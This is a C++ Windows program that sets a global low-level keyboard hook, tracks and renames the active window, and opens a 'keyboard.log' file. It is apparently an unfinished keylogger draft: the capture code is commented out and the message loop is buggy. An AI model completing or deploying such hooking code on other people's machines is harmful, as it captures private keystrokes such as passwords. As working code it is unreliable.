#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>
using namespace std;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParan);
HHOOK keyboardHook;
HWND prevWindow;
vector<char> charQue;
ofstream logfile;
char title[1024];
bool shifted = false;
bool controlled = false;
bool winkeyed = false;
bool capslocked = false;

int main()
{
	cout << "Hoking the keyboard" << endl;
	logfile.open("keyboard.log");
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	cout << "Hook: " << keyboardHook << endl;
	MSG msg{ 0 };
	while (GetMessage(&msg, NULL, 0, 0) != 0) //returns 0 when WM_QUIT gets called				
	UnhookWindowsHookEx(keyboardHook);
	return 0;

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	HWND fwindow = GetForegroundWindow();
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) { // key has been pressed
		if (prevWindow != fwindow) { // prints the window name only if the user has began typing in a new window
			wchar_t wtitle[1024];
			mbstowcs(wtitle, title, strlen(title) + 1);
			LPWSTR old_title = wtitle;
			SetWindowText(prevWindow, old_title);

			GetWindowTextA(fwindow, title, 1024);
			cout << "Title: " << title << endl;
			SetWindowText(fwindow, L"keyboard hooked application"); //LPCWSTR needs to have L as prefix to assign a string to it
			cout << "Setting title: from \"" << title << "\" to \"" << "keyboard hooked application\"" << endl;
			prevWindow = fwindow;
		}
		switch ((int)(key->vkCode)) {
		case 8:
		case 32:
		case 162:
		case 160:
		case 161:
		case 20:
		case 112:
			break;
		default:
			break;
		}
		//cout <<(char)(key->vkCode) << "(" << key->vkCode << "), ";
		/*if (key->vkCode != VK_RETURN) {
			if (key->vkCode == VK_SPACE) {

			}
			auto currentKey = (int)(key->vkCode);
			char charKey = currentKey;
			charQue.push_back(charKey);
		}
		else {
			cout << endl;

		}*/
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}